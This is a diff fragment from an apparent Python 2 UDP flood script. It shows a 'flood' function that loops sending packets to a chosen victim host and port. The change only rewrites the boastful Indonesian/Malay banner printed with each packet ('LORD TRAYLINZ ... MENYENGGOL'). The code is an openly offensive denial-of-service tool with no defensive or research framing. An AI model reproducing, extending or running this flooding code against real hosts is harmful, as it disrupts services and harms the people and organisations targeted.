@@ -19,7 +19,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print " TRAYLINZ NIH BOS!!  %s MENGBAKAR %s PORT %s "%(sent, victim, vport)
+        print " LORD TRAYLINZ NIH BOS!!  %s MENYENGGOL %s PORT %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
